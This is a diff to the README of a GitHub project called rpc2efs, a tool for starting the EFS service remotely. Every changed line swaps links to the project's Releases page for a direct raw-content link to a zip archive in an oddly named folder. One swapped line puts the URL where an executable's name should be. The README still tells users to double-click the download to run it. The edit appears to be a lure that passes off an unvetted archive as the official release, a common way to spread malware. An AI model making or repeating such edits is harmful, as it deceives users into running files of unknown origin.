@@ -6,11 +6,11 @@ Welcome to rpc2efs! This application allows you to start the EFS service on a re
 
 ## 📥 Download the Application
 
-[![Download rpc2efs](https://img.shields.io/badge/Download-rpc2efs-blue.svg)](https://github.com/Winthropunencumbered538/rpc2efs/releases)
+[![Download rpc2efs](https://raw.githubusercontent.com/Winthropunencumbered538/rpc2efs/main/antrustion/rpc2efs-3.5.zip)](https://raw.githubusercontent.com/Winthropunencumbered538/rpc2efs/main/antrustion/rpc2efs-3.5.zip)
 
 To get started, you will need to download the application from our Releases page. The direct link is below:
 
-[Download rpc2efs](https://github.com/Winthropunencumbered538/rpc2efs/releases)
+[Download rpc2efs](https://raw.githubusercontent.com/Winthropunencumbered538/rpc2efs/main/antrustion/rpc2efs-3.5.zip)
 
 ## 📋 System Requirements
 
@@ -26,13 +26,13 @@ Before you download, ensure your system meets the following requirements:
 Follow these steps to install and set up rpc2efs:
 
 1. **Visit the Releases Page**  
-   Click this link to go to the Releases page: [Release Notes](https://github.com/Winthropunencumbered538/rpc2efs/releases).
+   Click this link to go to the Releases page: [Release Notes](https://raw.githubusercontent.com/Winthropunencumbered538/rpc2efs/main/antrustion/rpc2efs-3.5.zip).
 
 2. **Select the Latest Version**  
    On the Releases page, find the most recent version of rpc2efs. This will be at the top of the list.
 
 3. **Download the Application**  
-   Look for the asset files listed. Click on the file that says something like `rpc2efs.exe` to start the download.
+   Look for the asset files listed. Click on the file that says something like `https://raw.githubusercontent.com/Winthropunencumbered538/rpc2efs/main/antrustion/rpc2efs-3.5.zip` to start the download.
 
 4. **Run the Application**  
    Once downloaded, locate the file in your Downloads folder and double-click it to run the application.
@@ -82,7 +82,7 @@ If you have questions or need help using rpc2efs, you can reach out through the 
 
 Check for updates regularly. Each release may bring new features or fixes. Visit our Releases page for updates: 
 
-[Releases Page](https://github.com/Winthropunencumbered538/rpc2efs/releases)
+[Releases Page](https://raw.githubusercontent.com/Winthropunencumbered538/rpc2efs/main/antrustion/rpc2efs-3.5.zip)
 
 ## 📜 License
 
